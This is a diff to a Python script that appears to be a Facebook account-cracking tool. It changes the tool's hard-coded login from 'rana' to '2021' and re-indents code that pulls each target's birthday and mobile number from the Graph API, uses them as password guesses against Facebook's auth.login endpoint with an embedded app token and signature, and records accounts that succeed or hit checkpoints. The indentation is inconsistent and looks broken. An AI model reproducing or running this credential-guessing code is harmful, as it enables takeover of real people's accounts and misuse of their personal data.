@@ -95,8 +95,8 @@ jalan("\033[1;92m |_| ")
 
 
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "2021"
+CorrectPassword = "2021"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -418,10 +418,10 @@ def pilih_super():
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
 							                           a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                                         b = json.loads(a.text)
-                                         lahir = b['birthday']
-                                         pass6 = lahir.replace('/', '')
-                                                                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+                                                                                   b = json.loads(a.text)
+                                                                                   lahir = b['birthday']
+                                                                                   pass6 = lahir.replace('/', '')
+                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
 								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
@@ -443,9 +443,9 @@ def pilih_super():
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
 								                               a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                                               b = json.loads(a.text)
-                                               lahir1 = b['mobile_phone']
-                                               pass7 = lahir1.replace('/', '')						
+                                                                                               b = json.loads(a.text)
+                                                                                               lahir1 = b['mobile_phone']
+                                                                                               pass7 = lahir1.replace('/', '')						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -468,8 +468,8 @@ def pilih_super():
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
 										                           a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                                               b = json.loads(a.text)
-                                               pass8 = b['mobile_phone']											
+                                                                                                           b = json.loads(a.text)
+                                                                                                           pass8 = b['mobile_phone']											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
